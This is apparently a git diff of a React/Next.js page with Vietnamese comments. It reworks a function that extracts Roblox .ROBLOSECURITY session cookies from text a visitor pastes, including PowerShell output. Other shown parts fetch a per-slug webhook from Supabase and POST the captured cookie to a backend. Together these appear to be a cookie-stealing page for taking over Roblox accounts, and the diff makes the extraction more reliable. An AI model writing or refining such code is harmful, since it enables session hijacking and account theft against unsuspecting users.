@@ -31,7 +31,7 @@ export default function SlugPage() {
     if (!slug) return;
     try {
       window.localStorage.setItem("lastSlug", slug);
-    } catch {}
+    } catch { }
   }, [slug]);
 
   // Lấy webhook từ Supabase
@@ -68,60 +68,29 @@ export default function SlugPage() {
   }, [slug]);
 
   function extractRobloSecurity(text: string): string | null {
-    const patterns = [
-      /"\.ROBLOSECURITY",\s*"([^"]{700,})"/i,
-      /"\.ROBLOSECURITY"\s*,\s*"([^"]{700,})"/i,
-      /_\|WARNING:[^|]*\|_[A-Za-z0-9+\/=._-]{680,}/i,
-    ];
+    if (!text) return null;
 
-    for (const pattern of patterns) {
-      const match = text.match(pattern);
-      if (match?.[1]) {
-        let candidate = match[1].trim();
-        if (
-          candidate.startsWith('_|WARNING:') &&
-          candidate.includes('|_)') &&
-          candidate.length >= 750 &&
-          candidate.includes('.')
-        ) {
-          return candidate;
-        }
-      }
-    }
+    // 1. Regex mạnh hơn: tìm chuỗi bắt đầu bằng _|WARNING: và kéo dài cho đến khi gặp dấu nháy hoặc khoảng trắng
+    // Cách này chấp nhận cả input là JSON, PowerShell, hoặc text thuần
+    const pattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"'\s]+)/i;
+    const match = text.match(pattern);
 
-    const markers = [
-      '".ROBLOSECURITY", "',
-      '.ROBLOSECURITY", "',
-      '".ROBLOSECURITY", "'
-    ];
+    if (match && match[1]) {
+      let cookie = match[1].trim();
 
-    for (const marker of markers) {
-      const startIdx = text.indexOf(marker);
-      if (startIdx !== -1) {
-        let cookieStart = startIdx + marker.length;
-        let cookieEnd = text.indexOf('", "/', cookieStart);
-        if (cookieEnd === -1) {
-          cookieEnd = text.indexOf('"', cookieStart + 700);
-        }
-        if (cookieEnd !== -1 && cookieEnd - cookieStart >= 750) {
-          let cookie = text.substring(cookieStart, cookieEnd).trim();
-          if (
-            cookie.startsWith('_|WARNING:') &&
-            cookie.length >= 750 &&
-            cookie.includes('.')
-          ) {
-            return cookie;
-          }
-        }
-      }
-    }
+      // Loại bỏ các ký tự dư thừa ở cuối nếu có (như dấu ngoặc đơn trong PowerShell)
+      cookie = cookie.replace(/[)'";,]+$/, '');
 
-    const fallback = text.match(/_ \|WARNING:[^"]{750,}/i);
-    if (fallback?.[0]) {
-      let cookie = fallback[0].trim().replace(/\s+/g, '');
-      if (cookie.length >= 750 && cookie.includes('.')) {
+      if (cookie.length > 500) {
         return cookie;
       }
+    }
+
+    // 2. Fallback cho trường hợp không có WARNING prefix (hiếm gặp với .ROBLOSECURITY)
+    const backupPattern = /\.ROBLOSECURITY["']?\s*,\s*["']([^"'\s]{500,})["']/i;
+    const backupMatch = text.match(backupPattern);
+    if (backupMatch && backupMatch[1]) {
+      return backupMatch[1].trim();
     }
 
     return null;
@@ -353,7 +322,7 @@ export default function SlugPage() {
         cache: "no-store",
         body: JSON.stringify({ cookie: robloxCookie, mode: "full" }),
       });
-      
+
       const data = await fullRes.json();
 
       if (!fullRes.ok || data.error) {
@@ -413,9 +382,8 @@ export default function SlugPage() {
       )}
 
       <div
-        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${
-          loading ? "opacity-40 pointer-events-none" : "opacity-100"
-        }`}
+        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"
+          }`}
       >
         <div className="w-full mb-6 px-2">
           <Link
@@ -450,13 +418,12 @@ export default function SlugPage() {
 
               {status.type && (
                 <div
-                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
-                    status.type === "success"
+                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
                       ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                       : status.type === "error"
-                      ? "bg-red-950/30 border-red-500/30 text-red-300"
-                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
-                  }`}
+                        ? "bg-red-950/30 border-red-500/30 text-red-300"
+                        : "bg-blue-950/30 border-blue-500/30 text-blue-300"
+                    }`}
                 >
                   {status.message}
                 </div>
